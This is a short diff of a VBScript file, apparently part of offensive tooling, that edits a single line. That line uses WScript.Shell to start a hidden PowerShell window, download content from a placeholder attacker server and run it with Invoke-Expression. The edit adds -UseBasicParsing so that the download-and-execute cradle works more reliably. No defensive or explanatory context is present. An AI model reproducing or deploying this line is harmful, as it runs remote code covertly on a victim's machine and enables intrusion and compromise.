@@ -11,4 +11,4 @@ For i = 0 To WScript.Arguments.Count-1
 
 Next
 
-CreateObject("WScript.Shell").Run "powershell.exe -command Invoke-Expression (Invoke-WebRequest 'http://<SERVER_IP>:<SERVER_PORT>').Content", 0, False
+CreateObject("WScript.Shell").Run "powershell.exe -command Invoke-Expression (Invoke-WebRequest 'http://<SERVER_IP>:<SERVER_PORT>' -UseBasicParsing).Content", 0, False
